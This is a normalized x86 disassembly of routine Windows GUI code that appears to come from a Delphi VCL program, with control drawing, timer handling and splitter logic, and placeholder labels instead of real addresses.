mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_423b2c
pop ebx
mov esp ebp
pop ebp
retn
jpe r-xdata
inc ebx
or al 0x89
inc ebp
hlt
mov al 0x78
inc ecx
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070015 ] al
outsb
dec ebp
outsd
jbe r-xdata
hlt
mov al 0x78
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070016 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] 0x8b55c08b
in al dx
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
sub_42ea30
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_4233a4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_423b2c
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_4233a4
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_423b2c
pop ebx
mov esp ebp
pop ebp
retn
sub_42eaf4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_4234b0
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_42ea30
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_42eb54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4482ec
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x168 ] 0x0
mov [ esi + 0x169 ] 0x0
mov edx 0x32
mov eax esi
call sub_440060
mov edx 0x32
mov eax esi
call sub_440084
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_42ebf8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x160 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi + 0x10 ]
call sub_4233a4
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_418d40
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_418d40
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_418d40
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_423b2c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ esi + 0x10 ]
call sub_4233a4
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_418d40
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_418d40
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_418d40
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_423b2c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ece8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov edx [ ebp + 0x10 ]
mov edx [ edx - 0x4 ]
mov ebx [ edx + 0x160 ]
mov edx eax
mov eax [ ebx + 0x10 ]
call sub_4233a4
mov ecx edi
mov edx esi
mov eax ebx
call sub_423b00
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_423aa0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_42ed28
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x10 ]
call sub_4234b0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x169 ] 0x6
jne r-xdata
mov [ ebp - 0x8 ] 0xff000014
mov [ ebp - 0xc ] 0xff000010
mov [ ebp - 0x8 ] 0xff000010
mov [ ebp - 0xc ] 0xff000014
jmp r-xdata
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_423480
mov dl 0x4
mov eax [ ebx + 0x10 ]
call sub_423464
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_4233a4
xor edx edx
mov eax [ ebx + 0x14 ]
call sub_4237a0
mov dl 0x2
mov eax [ ebx + 0x10 ]
call sub_423480
mov dl 0xe
mov eax [ ebx + 0x10 ]
call sub_423464
mov edx 0xffd8ce
mov eax [ ebx + 0x10 ]
call sub_4233a4
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_4237a0
mov eax [ ebp - 0x4 ]
call sub_4402a8
push eax
mov eax [ ebp - 0x4 ]
call sub_4402ec
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_423b64
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_42ee1a ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x169 ]
cmp eax 0x5
ja r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
xor edx edx
xor eax eax
call sub_418d68
lea eax [ ebp - 0x1c ]
call sub_42ebf8
pop ecx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
mov edx 0x1
mov eax 0x1
call sub_418d68
lea eax [ ebp - 0x1c ]
call sub_42ebf8
pop ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
sub ecx 0x2
xor edx edx
xor eax eax
call sub_418d68
lea eax [ ebp - 0x1c ]
call sub_42ebf8
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42ece8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x1
mov ecx 0x1
xor edx edx
mov eax [ ebp - 0xc ]
call sub_42ece8
pop ecx
jmp r-xdata
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42ece8
pop ecx
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_42ece8
pop ecx
jmp r-xdata
push ebp
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_42ece8
pop ecx
push ebp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_42ece8
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax 0x2
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_42ece8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_42ece8
pop ecx
sub_42efb0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41fb3c
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_42f038
call sub_420c88
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_42f000
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42f0ac
mov eax [ esi + 0x34 ]
call sub_420d3c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41fb88
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_42f038
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42f072
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f0ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42f12b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f132
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
sub_42f184
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448d28
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_432154
call sub_432234
test al al
je r-xdata
add esp 0xfffffff0
call sub_403540
mov edx 0xb9
mov eax esi
call sub_440060
mov edx 0x29
mov eax esi
call sub_440084
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_42f5d4
mov edx 0x1
mov eax esi
call sub_42f5f0
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_440a44
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_447358
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_42f248
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443f18
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42f2b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4466a4
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_44462c
sub_42f2f8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f3e8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4408a4
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_445568
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f3ef
lea eax [ ebp - 0x14 ]
call sub_403f6c
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4470c4
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4470c4
push eax
call InvalidateRect
sub_42f3f8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_42f430
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42f592
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_42eaf4
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_42f3f8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42eaf4
mov esi [ ebx + 0x208 ]
call sub_432154
call sub_432234
test al al
je r-xdata
push ebp
call sub_42f3f8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42eaf4
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_423684
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_423a28
mov eax ebx
call sub_4482a4
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_442b84
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4408a4
mov eax [ ebp - 0x1c ]
call sub_40442c
push eax
mov eax esi
call sub_423dcc
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f599
lea eax [ ebp - 0x1c ]
call sub_403f6c
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_4237a0
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_423cec
mov edx r-xdata
mov eax esi
call sub_423c48
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_42f644
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4430f8
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_42f69c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_445d20
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_42f7bd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_445d20
call sub_403a54
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_440084
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_440060
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_42f7d8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_447c0c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_42f804
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_4482ac
pop esi
pop ebx
retn
sub_42f840
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4482ec
mov [ esi + 0x16c ] 0x1
mov dl 0x3
mov eax esi
call sub_43fdb8
mov edx 0x3
mov eax esi
call sub_440060
mov dx 0xfff2
mov eax esi
call sub_440ab0
mov [ esi + 0x188 ] 0x1e
mov [ esi + 0x1a8 ] 0x3
mov [ esi + 0x1a0 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_42f8b8
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x170 ]
call sub_40321c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_448348
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_42f8e8
push ebx
push esi
mov ebx eax
push 0x412
push 0x0
mov eax [ ebx + 0x30 ]
call sub_4470c4
push eax
call GetDCEx
mov [ ebx + 0x180 ] eax
cmp [ ebx + 0x1a8 ] 0x3
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
mov eax [ ebx + 0x170 ]
call sub_4236b8
push eax
mov eax [ ebx + 0x180 ]
push eax
call SelectObject
mov [ ebx + 0x1a4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4234dc
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx 0xffffff
xor eax eax
call sub_42a234
mov edx eax
mov eax esi
call sub_423658
sub_42f964
push ebx
add esp 0xfffffff8
mov ebx eax
mov al [ ebx + 0x184 ]
xor al 0x1
mov [ ebx + 0x184 ] al
mov ecx esp
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_418d40
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x1ac ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x40 ]
add eax [ ebx + 0x1ac ]
mov [ esp ] eax
jmp r-xdata
push 0x5a0049
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call PatBlt
pop ecx
pop edx
pop ebx
retn
sub_42f9d0
push ebx
mov ebx eax
mov eax [ ebx + 0x1a4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
mov eax [ ebx + 0x30 ]
call sub_4470c4
push eax
call ReleaseDC
mov eax [ ebx + 0x170 ]
test eax eax
je r-xdata
push eax
mov eax [ ebx + 0x180 ]
push eax
call SelectObject
pop ebx
retn
call sub_40321c
xor eax eax
mov [ ebx + 0x170 ] eax
sub_42fa18
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov esi eax
xor ebx ebx
mov ecx esp
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_418d40
mov al [ esi + 0x5b ]
dec al
je r-xdata
dec [ esp + 0x4 ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esi + 0x30 ]
call sub_443dbc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ esi + 0x4c ]
add [ esp + 0x4 ] eax
dec al
je r-xdata
xor ebx ebx
inc edi
xor ebp ebp
dec [ esp ]
jmp r-xdata
dec al
je r-xdata
inc ebp
dec edi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ esi + 0x48 ]
add [ esp ] eax
jmp r-xdata
jmp r-xdata
mov edx ebp
mov eax [ esi + 0x30 ]
call sub_443d80
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_440244
mov eax [ esp + 0x10 ]
sub eax [ esp + 0x8 ]
jne r-xdata
mov eax ebx
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x14 ]
sub eax [ esp + 0xc ]
jne r-xdata
mov al [ esi + 0x5b ]
sub al 0x1
je r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov al [ esi + 0x5b ]
sub al 0x1
je r-xdata
dec [ esp + 0x8 ]
jmp r-xdata
sub al 0x2
jne r-xdata
dec [ esp + 0xc ]
